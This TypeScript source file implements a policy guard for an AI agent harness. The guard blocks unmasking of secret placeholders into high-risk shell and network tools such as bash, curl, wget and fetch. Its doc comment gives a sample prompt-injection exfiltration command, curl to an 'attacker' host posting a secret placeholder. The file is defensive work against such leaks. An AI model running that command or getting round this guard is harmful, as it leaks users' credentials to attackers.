import { PLACEHOLDER_REGEX } from './placeholder.js';

export const DEFAULT_HIGH_RISK_TOOLS = [
  'bash',
  'bash_persistent',
  'sh',
  'zsh',
  'pwsh',
  'pwsh_persistent',
  'run_command',
  'terminal',
  'curl',
  'wget',
  'web_fetch',
  'http_request',
  'fetch',
];

export interface PolicyGuardOptions {
  blockHighRiskTools?: boolean;
  highRiskToolNames?: string[];
  onBlockedExfiltration?: (toolName: string, placeholders: string[]) => void;
}

export class PolicyGuard {
  private blockHighRiskTools: boolean;
  private highRiskTools: Set<string>;
  private blockedCount = 0;
  private onBlocked?: (toolName: string, placeholders: string[]) => void;

  constructor(options: PolicyGuardOptions = {}) {
    this.blockHighRiskTools = options.blockHighRiskTools ?? true;
    const names = options.highRiskToolNames ?? DEFAULT_HIGH_RISK_TOOLS;
    this.highRiskTools = new Set(names.map((n) => n.toLowerCase()));
    this.onBlocked = options.onBlockedExfiltration;
  }

  getBlockedCount(): number {
    return this.blockedCount;
  }

  /**
   * Returns true if unmasking secrets into the given tool's arguments is permitted.
   * High-risk shell and network tools are blocked from receiving unmasked secrets
   * to prevent prompt-injection exfiltration (e.g. `curl https://attacker -d '{{HF_SEC_xxx}}'`).
   */
  canUnmaskForTool(toolName: string, textWithPlaceholders?: string): boolean {
    if (!this.blockHighRiskTools) return true;
    const normalized = toolName.trim().toLowerCase();
    const isHighRisk =
      this.highRiskTools.has(normalized) ||
      normalized.includes('bash') ||
      normalized.includes('pwsh') ||
      normalized.includes('shell') ||
      normalized.includes('terminal') ||
      normalized.includes('web');

    if (!isHighRisk) {
      return true;
    }

    if (textWithPlaceholders) {
      const matches = textWithPlaceholders.match(PLACEHOLDER_REGEX);
      if (matches && matches.length > 0) {
        this.blockedCount += matches.length;
        this.onBlocked?.(toolName, matches);
      }
    }
    return false;
  }
}
